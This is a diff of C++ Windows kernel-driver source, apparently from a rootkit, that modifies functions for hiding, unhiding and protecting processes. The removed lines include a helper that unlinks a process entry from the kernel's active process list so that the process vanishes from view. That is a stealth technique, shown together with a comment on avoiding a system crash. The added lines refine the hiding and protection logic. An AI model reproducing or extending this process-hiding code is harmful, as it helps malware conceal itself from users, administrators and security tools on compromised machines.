@@ -95,6 +95,9 @@ NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
 	if (activeProcessLinkListOffset == 0 || lockOffset == 0)
 		return STATUS_UNSUCCESSFUL;
 
+	if (FindProcess(pid, ProcessType::Hidden))
+		return STATUS_SUCCESS;
+
 	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
 
 	if (!NT_SUCCESS(status))
@@ -121,8 +124,8 @@ NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {
 		status = GetExceptionCode();
+		RemoveListEntry(&hiddenProcesses, &entry);
 	}
-	// RemoveListLinks(processListEntry);
 	ExReleasePushLockExclusive(listLock);
 	ObDereferenceObject(targetProcess);
 	return status;
@@ -152,7 +155,7 @@ NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
 	entryToRestore = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(this->hiddenProcesses, pid, finder);
 
 	if (!entryToRestore)
-		return STATUS_UNSUCCESSFUL;
+		return STATUS_NOT_FOUND;
 
 	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
 	ULONG lockOffset = GetProcessLockOffset();
@@ -321,7 +324,7 @@ bool ProcessHandler::ProtectProcess(_In_ ULONG pid) {
 		return false;
 
 	if (FindProcess(pid, ProcessType::Protected))
-		return false;
+		return true;
 	ProtectedProcessEntry* newEntry = AllocateMemory<ProtectedProcessEntry*>(sizeof(ProtectedProcessEntry));
 
 	if (!newEntry)
@@ -522,32 +525,6 @@ bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) 
 
 	processList->Count = count;
 	return true;
-}
-
-/*
-* Description:
-* RemoveListLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
-* that "removing" the current entry.
-*
-* Parameters:
-* @current [PLIST_ENTRY] -- Current process entry.
-*
-* Returns:
-* There is no return value.
-*/
-void ProcessHandler::RemoveListLinks(PLIST_ENTRY current) {
-	PLIST_ENTRY previous;
-	PLIST_ENTRY next;
-
-	previous = current->Blink;
-	next = current->Flink;
-
-	previous->Flink = next;
-	next->Blink = previous;
-
-	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
-	current->Blink = (PLIST_ENTRY)&current->Flink;
-	current->Flink = (PLIST_ENTRY)&current->Flink;
 }
 
 /*
